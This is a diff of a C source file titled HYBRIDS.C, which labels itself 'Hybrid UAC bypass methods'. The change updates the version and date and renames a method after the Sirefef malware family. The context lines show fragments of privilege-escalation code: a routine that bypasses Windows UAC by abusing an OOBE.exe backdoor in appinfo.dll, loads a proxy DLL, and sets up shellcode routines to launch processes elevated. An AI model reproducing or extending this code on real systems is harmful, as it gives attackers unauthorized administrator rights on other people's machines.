@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.00
+*  VERSION:     2.01
 *
-*  DATE:        16 Nov 2015
+*  DATE:        04 Jan 2016
 *
 *  Hybrid UAC bypass methods.
 *
@@ -22,7 +22,7 @@
 #include <Shlwapi.h>
 #pragma comment(lib, "shlwapi.lib")
 
-ELOAD_PARAMETERS_4 g_ElevParamsH1N1;
+ELOAD_PARAMETERS_4 g_ElevParamsSirefef;
 
 /*
 * ucmAvrfMethod
@@ -388,14 +388,14 @@ DWORD WINAPI ucmElevatedLaunchProc(
 }
 
 /*
-* ucmH1N1Method
+* ucmSirefefMethod
 *
 * Purpose:
 *
 * Bypass UAC by abusing OOBE.exe backdoor hardcoded in appinfo.dll
 *
 */
-BOOL ucmH1N1Method(
+BOOL ucmSirefefMethod(
 	PVOID ProxyDll,
 	DWORD ProxyDllSize
 	)
@@ -409,7 +409,7 @@ BOOL ucmH1N1Method(
 	PIMAGE_OPTIONAL_HEADER  opth = (PIMAGE_OPTIONAL_HEADER)((char *)fh + sizeof(IMAGE_FILE_HEADER));
 	LPVOID                  remotebuffer = NULL, newEp, newDp;
 	SIZE_T                  NumberOfBytesWritten = 0;
-	PELOAD_PARAMETERS_4     elvpar = &g_ElevParamsH1N1;
+	PELOAD_PARAMETERS_4     elvpar = &g_ElevParamsSirefef;
 	LPVOID                  elevproc = ucmElevatedLaunchProc;
 
 	WCHAR szBuffer[MAX_PATH * 2];
@@ -473,7 +473,7 @@ BOOL ucmH1N1Method(
 		}
 
 		//setup basic shellcode routines
-		RtlSecureZeroMemory(&g_ElevParamsH1N1, sizeof(g_ElevParamsH1N1));
+		RtlSecureZeroMemory(&g_ElevParamsSirefef, sizeof(g_ElevParamsSirefef));
 		elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
 		elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ctx.hKernel32, "WaitForSingleObject");
 		elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ctx.hKernel32, "CloseHandle");
